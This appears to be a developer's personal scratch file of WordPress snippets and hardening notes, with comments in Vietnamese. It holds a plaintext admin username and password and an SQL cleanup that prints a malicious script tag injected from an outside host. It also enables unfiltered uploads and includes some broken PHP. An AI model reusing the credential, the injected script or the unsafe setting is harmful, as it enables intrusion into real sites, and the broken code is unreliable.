//Fix img thumbnail Function

function get_first_image() {
    global $post, $posts;
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $first_img = $matches[1][0];
    
    return $first_img;
}

// Fix img thumbnail Cate
$kim = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID), 'medium'); 
    $firts_image= get_first_image($post->ID);

    if($kim):
        $img = ($kim[0]!='')?$kim[0]:$firts_image[0];
    elseif($firts_image):
        $img = get_first_image($post->ID);   
    else:
        $img = '/wp-content/themes/codeteam/logo.png';
    endif;
					
				
			
User-agent: *
Disallow: /wp-admin/
Disallow: /wp-includes/
Disallow: /wp-json/
Disallow: */?replytocom
Disallow: *?replytocom
Disallow: *?s
Disallow: *?attachment
Disallow: */?attachment
Disallow: *?attachment_id
Disallow: *pageinfo*
Sitemap: https://benhvienhongha.vn/sitemap_index.xml			

codeadmin    
Y@s2H#R47zi^gQrYaK)5b5w&

define('ALLOW_UNFILTERED_UPLOADS', true);

Bạn có thực sự muốn thực hiện lệnh truy vấn sau đây không?
DELETE FROM `wpvvk_posts` WHERE `wpvvk_posts`.`ID` = 1772;
u181874440.chuatrimun.com.vn



<meta property="og:image" content="https://benhvienthammykangnam.com.vn/cp/tham-my-ham-mat/ngay-vang-chinh-hinh-ham-mat/media/images/thumb.jpg?ver=31" />


add_filter('use_block_editor_for_post', '__return_false');

4. xoa phpmyadmin

UPDATE wpdb_posts SET post_content=(REPLACE (post_content, "<script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script><script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script>","")) 

UPDATE wpzx_posts SET post_content=(REPLACE (post_content, '','')) 

<?php 

if(is_single()) {
	$post_categories = wp_get_post_categories(get_the_ID());
	$idcat= $post_categories[0];
	
  }
  if(is_category()){
	$idcat=get_query_var('cat');    
  }

?>
<?php $video = get_field('video','category_' . $idcat); ?>

<?php
function change_theme($theme) 
{
    /*$t='';
    if($_GET["t"] != null){
            $t = $_GET["t"];
            if($t!=''){
                if(!wp_is_mobile()){
                    return 'dichvu';
                }else{
                    return 'mdichvu';
                }
            }
    }else{return $theme;}*/
    
    
    if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') !== false){
                return 'dichvu';
        }else{
            if(!wp_is_mobile()){return 'dichvu';}else{
            
            return 'mdichvu';
        }}
}
?>

//js fix https
	<script>
		if (location.protocol !== 'https:') {
			location.replace(`https:${location.href.substring(location.protocol.length)}`);
		}
	</script>
	

<?php
// Cate Loop
    foreach((get_the_category()) as $category) { 
		echo $category->cat_name . ' '; 
	} 
?>	

<?
// WP_Security

// --------------> wp-config.php

// Cách tắt cập nhật WordsPress
define( 'WP_AUTO_UPDATE_CORE', false );

//Khong cho edit theme
define( 'DISALLOW_FILE_EDIT', true );

//Disable updating everything for WordPress
define( 'DISALLOW_FILE_MODS', true );
define( 'AUTOMATIC_UPDATER_DISABLED', true );

//Limit Revisions
define('AUTOSAVE_INTERVAL', 300); // seconds
define('WP_POST_REVISIONS', 30);

// --------------> function.php

// Tắt cập nhật plugin
add_filter( 'auto_update_plugin', '__return_false' );

// Tắt cập nhật cho themes
add_filter( 'auto_update_theme', '__return_false' );

// Vô hiệu hóa thông báo cập nhật của WordPress: 
add_action ( 'after_setup_theme' , 'remove_core_updates' ); 
function remove_core_updates () { if (! current_user_can ( 'update_core' )){ return ;} 
add_action ( 'init' , create_function ( '$a' , “remove_action( 'Init', 'wp_version_check' );” ), 2 ); 
add_filter ( 'pre_option_update_core' , '__return_null' ); 
add_filter ( 'pre_site_transient_update_core' , '__return_null' ); }

// Vô hiệu hoá thông báo cập nhật của các Plugin trong WordPress:

remove_action ( 'load-update-core.php' , 'wp_update_plugins' ); 
add_filter ( 'pre_site_transient_update_plugins' , '__return_null' );

// Vô hiệu hoá tất cả các thông báo cập nhật trong WordPress

function remove_core_updates (){ global $wp_version ; return ( object ) array ( 'last_checked' => time (), 'version_checked' => $wp_version ,); } 
add_filter ( 'pre_site_transient_update_core' , 'remove_core_updates' ); 
add_filter ( 'pre_site_transient_update_plugins' , 'remove_core_updates' ); 
add_filter ( 'pre_site_transient_update_themes' , 'remove_core_updates' );


// chi cho phep tai len các file gif png jpg
add_filter('wp_handle_upload_prefilter', 'yoursite_wp_handle_upload_prefilter');
function yoursite_wp_handle_upload_prefilter($file) {
    if ($file['type']=='application/octet-stream' && isset($file['tmp_name'])) {
        $file_size = getimagesize($file['tmp_name']);
        if (isset($file_size['error']) && $file_size['error']!=0) {
            $file['error'] = "Unexpected Error: {$file_size['error']}";
            return $file;
        } else {
            $file['type'] = $file_size['mime'];
        }
    }
    list($category,$type) = explode('/',$file['type']);
    if ('image'!=$category || !in_array($type,array('jpg','jpeg','gif','png'))) {
        $file['error'] = "Xin lỗi bạn chỉ có thể tải lên file ảnh định dạng .GIF, .JPG, hay .PNG";
    } else if ($post_id = (isset($_REQUEST['post_id']) ? $_REQUEST['post_id'] : false)) {
        if (count(get_posts("post_type=attachment&post_parent={$post_id}"))>20) // so hinh anh duoc phép tai len
        $file['error'] = "Xin lỗi, bạn không thể tải lên nhiều hơn 20 hình ảnh.";
    }
    return $file;
}

// --------------> htacces.txt

# Bảo vệ WordPress file config
<files wp-config.php>
    order allow,deny
    deny from all
</files>

# Tắt xmlrpc.php
<files xmlrpc.php>
order allow,deny
deny from all
</files>

// Tắt khả năng thực thi PHP trong thư mục được chỉ định .htaccess
<Files *.php>
    deny from all
</Files>

